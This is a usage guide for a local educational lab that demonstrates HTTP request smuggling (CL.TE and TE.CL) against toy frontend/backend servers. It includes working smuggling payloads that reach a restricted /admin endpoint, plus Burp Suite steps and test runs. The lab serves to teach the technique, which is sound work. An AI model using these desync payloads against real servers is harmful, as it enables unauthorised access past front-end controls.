# HTTP Request Smuggling Lab — Quick Usage Guide

This guide walks you through setting up and running the HTTP Request Smuggling educational lab.

---

## 🚀 1. Starting the Lab

### Option A: Using Docker Compose (Recommended)

Run the following command in the project root directory:

```bash
docker compose up --build
```

This starts two isolated environments:
- **CL.TE Lab**: `http://127.0.0.1:8080`
- **TE.CL Lab**: `http://127.0.0.1:8081`

### Option B: Running Standalone with Python

If Docker is unavailable, you can start the components directly using Python:

**Terminal 1 — CL.TE Lab (Port 8080):**
```bash
python cl-te/backend.py
# In another window:
python cl-te/frontend.py
```

**Terminal 2 — TE.CL Lab (Port 8081):**
```bash
python te-cl/backend.py
# In another window:
python te-cl/frontend.py
```

---

## 🎯 2. Executing CL.TE Request Smuggling

In **CL.TE**, the frontend uses `Content-Length` (CL) while the backend uses `Transfer-Encoding: chunked` (TE).

### Method 1: Using the Python Raw TCP Client

Run the automated test payload:

```bash
python tests/raw_client.py --port 8080 --file examples/cl-te-request.txt
```

#### What Happens:
1. The frontend reads **50 bytes** as the request body based on `Content-Length: 50`.
2. The frontend forwards the raw request to the backend.
3. The backend processes the body using `Transfer-Encoding: chunked` and stops at `0\r\n\r\n` (5 bytes).
4. The remaining bytes (`GET /admin HTTP/1.1...`) sit in the persistent TCP connection buffer.
5. The backend parses those leftover bytes as **Request #2**, returning the restricted `ADMIN AREA` response!

---

### Method 2: Using Burp Suite Repeater

1. Configure Burp Suite Repeater target to `127.0.0.1` port `8080` (HTTP).
2. **Crucial Setting**: In Repeater menu, **uncheck** `Update Content-Length` (so Burp does not overwrite your crafted `Content-Length`).
3. Send the following request body:

```http
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost:8080

```

4. You will receive two HTTP responses on the same TCP connection:
   - `HTTP/1.1 200 OK` → `POST received.`
   - `HTTP/1.1 200 OK` → `ADMIN AREA`

---

## 🎯 3. Executing TE.CL Request Smuggling

In **TE.CL**, the frontend uses `Transfer-Encoding: chunked` (TE) while the backend uses `Content-Length` (CL).

### Method 1: Using the Python Raw TCP Client

Run the automated test payload:

```bash
python tests/raw_client.py --port 8081 --file examples/te-cl-request.txt
```

#### What Happens:
1. The frontend decodes the chunked body (reading up to `0\r\n\r\n`).
2. The frontend forwards the decoded body with `Content-Length: 4` to the backend.
3. The backend reads only **4 bytes** (`xx\r\n`) as the body based on `Content-Length: 4`.
4. The remaining decoded bytes (`GET /admin HTTP/1.1...`) sit in the TCP buffer.
5. The backend parses those leftover bytes as **Request #2**, returning the `ADMIN AREA` response!

---

### Method 2: Using Burp Suite Repeater

1. Configure Burp Suite Repeater target to `127.0.0.1` port `8081` (HTTP).
2. **Uncheck** `Update Content-Length`.
3. Send the following request body:

```http
POST / HTTP/1.1
Host: localhost:8081
Content-Length: 4
Transfer-Encoding: chunked

31
xx
GET /admin HTTP/1.1
Host: localhost:8081


0

```

---

## 🧪 4. Running Automated Tests

Run the built-in test suite to verify desynchronization programmatically:

```bash
# Test CL.TE lab
python tests/test_cl_te.py

# Test TE.CL lab
python tests/test_te_cl.py
```

Expected output:
```text
[PASS] Backend processed the smuggled request!
       The frontend saw ONE request.
       The backend saw TWO requests.
       [PASS] Smuggled request reached /admin endpoint!
```

---

## 🔍 5. Inspecting Server Logs

To visually compare frontend vs backend interpretations, view the logs:

```bash
# Docker Compose logs:
docker compose logs -f cl-te-backend
docker compose logs -f te-cl-backend
```

You will see:
- **Frontend log**: Shows how many bytes the frontend consumed.
- **Backend log**: Shows `[WARNING] X bytes remaining in stream — will attempt to parse as next request!`, followed by the parsed smuggled request line and headers.
